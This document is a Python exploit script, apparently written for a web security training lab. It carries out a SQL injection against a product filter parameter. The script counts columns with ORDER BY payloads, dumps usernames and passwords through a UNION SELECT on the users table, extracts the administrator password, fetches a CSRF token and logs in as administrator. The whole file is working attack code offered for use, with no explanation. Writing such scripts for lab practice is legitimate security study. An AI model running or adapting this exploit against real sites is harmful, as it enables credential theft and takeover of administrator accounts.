import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def find_no_of_columns(url):
    uri = '/filter?category=Gifts'
    for i in range(1,10):
        payload = "'order+by+%s--"%i
        r = requests.get(url+uri+payload, verify = False, proxies = proxies)
        if r.status_code != 200:
            return i-1
    return False

def find_credentials(s, url):
    path = '/filter?category=Gifts'
    payload_list = "'UNION+select+username,password+from+users--"
    res = s.get(url+path+payload_list,verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    th_tag = soup.find('th', string='administrator')
    td_tag = th_tag.find_next('td')
    password = td_tag.get_text(strip=True)
    return password
    

def get_csrf_token(s, url):
    path = '/login'
    r = s.get(url+path, verify = False, proxies = proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sql_injection(s, url):
    path = '/login'
    cred = find_credentials(s,url)
    csrf = get_csrf_token(s, url)
    data = {'csrf':csrf,'username':'administrator','password':cred}
    res = s.post(url+path, data=data, verify=False, proxies=proxies)
    if 'Log out' in res.text:
        print("SQL Injection successful.")
        print("you logged in as administrator.")
    else:
        print("SQL Injection failed.")


if __name__=='__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("Usage: python3 %s <url>" %sys.argv[0])
        print("Example: python %s example.com" %sys.argv[0])
        sys.exit(-1)
    print("(+) Finding number of columns...")
    number = find_no_of_columns(url)
    print("(+) number of columns : %s" %number)
    s = requests.session()

    exploit_sql_injection(s, url)